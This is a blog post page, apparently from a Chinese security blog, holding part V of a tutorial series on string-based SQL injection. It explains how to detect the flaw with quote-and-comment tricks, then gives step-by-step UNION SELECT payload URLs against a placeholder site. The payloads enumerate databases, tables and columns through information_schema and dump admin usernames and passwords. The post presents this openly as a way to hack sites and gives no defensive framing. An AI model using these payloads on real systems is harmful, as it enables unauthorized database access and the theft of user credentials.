@@ -1,0 +1,437 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>SQLi--PART V:String Based SQL injection |     tudouya&#39;s secblog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="tudouya">
+    
+    <meta name="description" content="PrefaceNone
+What is String Based SQL injection and how to notice them?To make this simple to understand, String Based SQL injection happens when the s">
+    
+    
+    
+    
+    <link rel="alternative" href="/atom.xml" title="    tudouya&#39;s secblog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <link href="//cdn.bootcss.com/highlight.js/9.1.0/styles/railscasts.min.css" rel="stylesheet">
+    <style type="text/css">
+      figure {
+        overflow-x: auto;
+      }
+    </style>
+</head>
+
+  <body>
+    <header>
+      <div>
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="    tudouya&#39;s secblog">    tudouya&#39;s secblog</a></h1>
+				<h2 class="blog-motto">~The quieter you become,the more you can hear~</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/sitemap.xml">sitemap</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li><form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:sec.php101.cn">
+					</form></li>
+				</ul>
+			</nav>
+</div>
+    </header>
+    <div id="wrap">
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+    <time datetime="2014-11-09T18:15:03.000Z" itemprop="datePublished">
+      <a href="/2014/11/10/SQLi--PART-VString-Based-SQL-injection/" title="SQLi--PART V:String Based SQL injection" itemprop="url" class="article-time">2014-11-10</a>
+    </time>
+
+  <h1 itemprop="name" class="article-name">
+    
+      <a href="/2014/11/10/SQLi--PART-VString-Based-SQL-injection/" title="SQLi--PART V:String Based SQL injection" itemprop="url"><span>SQLi--PART V:String Based SQL injection</span></a>
+  </h1>
+</header>
+
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-String-Based-SQL-injection-and-how-to-notice-them"><span class="toc-number">2.</span> <span class="toc-text">What is String Based SQL injection and how to notice them?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-to-this-issue-in-order-to-hack-a-site-with-String-Based-SQL-injection"><span class="toc-number">3.</span> <span class="toc-text">Solution to this issue in order to hack a site with String Based SQL injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#String-Union-Based-SQL-injection"><span class="toc-number">4.</span> <span class="toc-text">String-Union Based SQL injection</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>None</p>
+<h2 id="What-is-String-Based-SQL-injection-and-how-to-notice-them"><a href="#What-is-String-Based-SQL-injection-and-how-to-notice-them" class="headerlink" title="What is String Based SQL injection and how to notice them?"></a>What is String Based SQL injection and how to notice them?</h2><p>To make this simple to understand, String Based SQL injection happens when the site is vulnerable to SQL injection but doesn’t show us the results needed to be displayed after executing our SQLi query.<br>Common known issues that proves the site being vulnerable to String Based are:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;order by&quot; doesn&apos;t work, example: order by 100--</span><br><span class="line">&quot;group by&quot; doesn&apos;t work</span><br><span class="line">&quot;having 1=2&quot; doesn&apos;t work</span><br><span class="line">queries related to SQL injection doesn&apos;t work (will show a normal page even though site is vuln to SQLi)</span><br></pre></td></tr></table></figure></p>
+<h2 id="Solution-to-this-issue-in-order-to-hack-a-site-with-String-Based-SQL-injection"><a href="#Solution-to-this-issue-in-order-to-hack-a-site-with-String-Based-SQL-injection" class="headerlink" title="Solution to this issue in order to hack a site with String Based SQL injection"></a>Solution to this issue in order to hack a site with String Based SQL injection</h2><p>The answer to this problem is by using the following format while trying to hack a site with SQLi.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://site.com/index.php?id=10&apos; order by 1000--+</span><br></pre></td></tr></table></figure></p>
+<p>That will show us the error, hence displaying the results according to our query.<br>The point here is that we used the quote ‘ and the + sign in our query:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=X&apos; order by--+</span><br></pre></td></tr></table></figure></p>
+<p>Alright that you’ve got the point lets try String Based on some of the other types of SQL injection shall we.</p>
+<h2 id="String-Union-Based-SQL-injection"><a href="#String-Union-Based-SQL-injection" class="headerlink" title="String-Union Based SQL injection"></a>String-Union Based SQL injection</h2><p>Step1:Obtaining the number of columns (in this example, we’ll use 10 columns)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/index.php?id=234&apos; order by 11--+</span><br></pre></td></tr></table></figure></p>
+<p>Results show error, so we’ll assume as 10 columns, since it’ll be an example for our process.</p>
+<p>Step2:Obtaining the Databases<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/index.php?id=-234&apos; UNION SELECT 1,2,3,4,5,group_concat(schema_name,0x0a),7,8,9,10 from information_schema.schemata--+</span><br></pre></td></tr></table></figure></p>
+<p>Results will display the databases on their website<br><strong>Note: If you don’t know anything about UNION Based SQL injection, I suggest you read one of my tutorials to progress further in this step</strong></p>
+<p>Step3: Obtaining the Tables from the current Database<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/index.php?id=-234&apos; UNION SELECT 1,2,3,4,5,group_concat(table_schema,0x0a),7,8,9,10 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></p>
+<p>Results will display the current table names.<br>For this example, we’ll be using the table name: “admin”.  </p>
+<p>Step4: Obtaining Column names from a specific table (which in this example is “admin”)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/index.php?id=-234&apos; UNION SELECT 1,2,3,4,5,group_concat(column_name,0x0a),7,8,9,10 from information_schema.columns where table_name=0x61646d696e--+</span><br></pre></td></tr></table></figure></p>
+<p>Results will display the column names from the current table<br>To convert plain text to hex, use: <a href="http://www.swingnote.com/tools/texttohex.php" target="_blank" rel="external">http://www.swingnote.com/tools/texttohex.php</a>.<br>For this example, we’ll use “username” and “password” as our column names.</p>
+<p>Step5: Obtaining Data from Column names<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/index.php?id=-234&apos; UNION SELECT 1,2,3,4,5,group_concat(username,0x3a,password,0x0a),7,8,9,10 from admin--+</span><br></pre></td></tr></table></figure></p>
+<p>Results will display the data given by the columns you have chosen</p>
+<p>This can be also done with Error Based SQL injection, Blind Based and other types of SQL injection.<br>Please refer to my previous tutorials to know more about Error Based and Union Based.<br><br></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/A-SQLi/">A-SQLi</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/MegaSQLi/">MegaSQLi</a><a href="/tags/String-Based/">String Based</a>
+  </div>
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://sec.php101.cn/2014/11/10/SQLi--PART-VString-Based-SQL-injection/" data-title="SQLi--PART V:String Based SQL injection |     tudouya&#39;s secblog" data-tsina="undefined" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2014/11/28/SQLi--PART-VIBoolean-Based-Blind-Injection/" title="SQLi--PART VI:Boolean Based Blind Injection">
+  <strong>上一篇：</strong><br/>
+  <span>
+  SQLi--PART VI:Boolean Based Blind Injection</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2014/11/10/SQLi--PART-IVError-BasedDouble-Query-SQL-injection/"  title="SQLi--PART IV:Error Based/Double Query SQL injection">
+ <strong>下一篇：</strong><br/> 
+ <span>SQLi--PART IV:Error Based/Double Query SQL injection
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-String-Based-SQL-injection-and-how-to-notice-them"><span class="toc-number">2.</span> <span class="toc-text">What is String Based SQL injection and how to notice them?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-to-this-issue-in-order-to-hack-a-site-with-String-Based-SQL-injection"><span class="toc-number">3.</span> <span class="toc-text">Solution to this issue in order to hack a site with String Based SQL injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#String-Union-Based-SQL-injection"><span class="toc-number">4.</span> <span class="toc-text">String-Union Based SQL injection</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+			<li><a href="/categories/A-SQLi/" title="A-SQLi">A-SQLi<sup>7</sup></a></li>
+		
+			<li><a href="/categories/B-XSS/" title="B-XSS">B-XSS<sup>2</sup></a></li>
+		
+			<li><a href="/categories/H-AttackFlow/" title="H-AttackFlow">H-AttackFlow<sup>1</sup></a></li>
+		
+			<li><a href="/categories/T-Tools/" title="T-Tools">T-Tools<sup>1</sup></a></li>
+		
+			<li><a href="/categories/Z-Other/" title="Z-Other">Z-Other<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/Blind/" title="Blind">Blind<sup>2</sup></a></li>
+		
+			<li><a href="/tags/Boolean-Based/" title="Boolean Based">Boolean Based<sup>2</sup></a></li>
+		
+			<li><a href="/tags/Dork/" title="Dork">Dork<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Double-Query/" title="Double Query">Double Query<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Error-Based/" title="Error Based">Error Based<sup>1</sup></a></li>
+		
+			<li><a href="/tags/MegaSQLi/" title="MegaSQLi">MegaSQLi<sup>4</sup></a></li>
+		
+			<li><a href="/tags/String-Based/" title="String Based">String Based<sup>1</sup></a></li>
+		
+			<li><a href="/tags/crypt/" title="crypt">crypt<sup>1</sup></a></li>
+		
+			<li><a href="/tags/hash/" title="hash">hash<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+</div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+<div>
+<br />
+</div>
+
+    </div>
+</div>
+    <footer><div id="footer" >
+	
+    <div class="social-font" class="clearfix">
+        
+        <a href="http://weibo.com/5050395856" target="_blank" class="icon-weibo" title="weibo"></a>
+        
+        
+        <a href="https://github.com/tudouya" target="_blank" class="icon-github" title="github"></a>
+        
+        
+        
+        
+        
+        
+        <a href="mailto:568865013@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+        
+    </div>
+	<section class="info">
+		<p class="l1">
+            keep foolish~keep hungry
+        </p>
+            <!-- <br/> -->
+        <p class="l2">
+			～如果我们不选择堕落，那么地狱的存在还有什么意义～
+        </p>
+	</section>
+	 
+		<p class="copyright">Powered by <a href="http://zespia.tw/hexo/" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/RagingCat/hexo-theme-ragingcat" target="_blank" title="hexo-theme-ragingcat">Raging Cat</a> © 2016
+		
+		<a href="http://sec.php101.cn/about" target="_blank" title="tudouya">tudouya</a>
+		
+		</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize();
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+      
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"ragingcat"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<style type="text/css">
+</style>
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script><script type="text/javascript">
+$(document).ready(function(){
+    $('pre').each(function(i, block) {
+      hljs.highlightBlock(block);
+    });
+    $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+});
+</script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-60243036-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript"
+   src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+  </body>
+</html>
